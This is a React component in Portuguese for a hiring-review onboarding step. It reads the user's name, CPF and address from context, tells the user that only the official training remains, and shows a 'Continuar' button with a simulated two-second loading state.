/* eslint-disable no-unused-vars */

import React, { useContext, useEffect, useState } from 'react';
import { ChevronRight, Loader2 } from 'lucide-react';
import Maintexts from "../../modules/Main-texts";
import Headlines from "../../modules/Headlines";
import Paragraphs from "../../modules/Paragraphs";
import { motion } from 'framer-motion';
import gerenteImg from "../../../assets/manager-min.webp";
import { ProcessContext } from '../../../contexts/ProcessContextDefinition.js';

const equipamentos = [
    "Notebook Dell 2024",
    "Kit teclado e mouse Dell",
    "Headphone",
    "Mousepad",
    "Camisetas",
    "Crachá"
];

const ReviewContratacao = ({ onContinue }) => {
    const { processData } = useContext(ProcessContext);
    const user = processData?.userData || {};

    // Lógica robusta para exibir o nome corretamente, incluindo nomeCompleto do contexto
    let nomeCompleto = "";
    if (user.nomeCompleto && typeof user.nomeCompleto === "string" && user.nomeCompleto.trim().length > 0) {
        nomeCompleto = user.nomeCompleto.trim();
    } else if (user.nome && typeof user.nome === "string" && user.nome.trim().length > 0) {
        nomeCompleto = user.nome.trim();
    } else if (user.firstName && typeof user.firstName === "string" && user.firstName.trim().length > 0) {
        nomeCompleto = user.firstName.trim();
        if (user.lastName && typeof user.lastName === "string" && user.lastName.trim().length > 0) {
            nomeCompleto += ` ${user.lastName.trim()}`;
        }
    } else {
        nomeCompleto = "Seu nome completo";
    }

    const cpf = user.cpf || "";
    const dataInicio = user.dataInicio || "daqui (15 dias próxima segunda)";
    const turnoTrabalho = user.turnoTrabalho || "20:00 às 05:00 (1h de intervalo)";
              // Busca o logradouro salvo no contexto (userData.endereco.Logradouro)
              const endereco = user.endereco && user.endereco.Logradouro
                  ? user.endereco.Logradouro
                  : "endereço não informado";

    const [isLoading, setIsLoading] = useState(false);
    const handleContinue = () => {
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            onContinue();
        }, 2000); // 2 segundos de loading
    };



    useEffect(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }, []);




    return (
        <div className="p-6 min-h-screen bg-[#0a0026] ">
            {/* Código de aprovação */}
       

            <Maintexts>
                <Headlines variant="white">
                    Tudo certo, agora para começar a trabalhar você precisa apenas concluir o treinamento oficial
                </Headlines>
                <Paragraphs variant="white">
                    Já estamos com tudo pronto, agora complete o treinamento e estará pronto(a) para começar!
                </Paragraphs>
            </Maintexts>

            {/* Informações do colaborador */}
          

            {/* Botão de confirmar */}
            <div className="w-full flex mt-30 justify-center">
                <motion.button
                    onClick={handleContinue}
                    disabled={isLoading}
                    whileTap={{ scale: 0.97 }}
                    whileHover={{ scale: isLoading ? 1 : 1.03 }}
                    className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-[#1655ff] transition-all duration-300 ${isLoading ? 'opacity-60 cursor-not-allowed' : ''}`}
                    style={{
                        background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
                        fontSize: '15pt',
                        boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
                        border: 'none',
                        opacity: isLoading ? 0.7 : 1
                    }}
                >
                    {isLoading ? (
                        <>
                            <motion.div
                                className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                                animate={{ rotate: 360 }}
                                transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                                style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                            />
                            <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
                        </>
                    ) : (
                        <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15pt' }}>Continuar </span>
                    )}
                </motion.button>
            </div>
        </div>
    );
};

export default ReviewContratacao;

